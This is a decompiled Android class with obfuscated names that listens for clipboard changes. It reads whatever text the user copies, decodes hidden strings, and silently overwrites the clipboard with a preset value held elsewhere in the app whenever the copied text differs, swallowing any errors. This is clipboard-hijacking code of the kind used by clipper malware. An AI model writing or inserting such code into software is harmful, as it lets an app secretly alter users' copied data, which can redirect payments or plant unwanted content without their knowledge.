package com.a.b.a;

import android.content.ClipData;
import android.content.ClipboardManager;

/* loaded from: classes.dex */
final class bh implements ClipboardManager.OnPrimaryClipChangedListener {
    final /* synthetic */ bf a;

    /* JADX INFO: Access modifiers changed from: package-private */
    public bh(bf bfVar) {
        this.a = bfVar;
    }

    @Override // android.content.ClipboardManager.OnPrimaryClipChangedListener
    public final void onPrimaryClipChanged() {
        ClipboardManager clipboardManager;
        ClipboardManager clipboardManager2;
        String str;
        String str2;
        ClipboardManager clipboardManager3;
        ClipData.Item itemAt;
        try {
            clipboardManager = this.a.k;
            ClipData primaryClip = clipboardManager.getPrimaryClip();
            String str3 = "";
            if (primaryClip != null && primaryClip.getItemCount() > 0 && (itemAt = primaryClip.getItemAt(0)) != null) {
                str3 = itemAt.getText().toString();
            }
            aq.a("dpqz", 1);
            new StringBuilder().append(aq.a("受玶剰贺枅冋宿叞曺3D", 6)).append(str3);
            clipboardManager2 = this.a.k;
            if (clipboardManager2 != null) {
                str = this.a.j;
                if (str3.equals(str)) {
                    return;
                }
                str2 = this.a.j;
                ClipData newPlainText = ClipData.newPlainText("", str2);
                clipboardManager3 = this.a.k;
                clipboardManager3.setPrimaryClip(newPlainText);
            }
        } catch (Throwable th) {
        }
    }
}
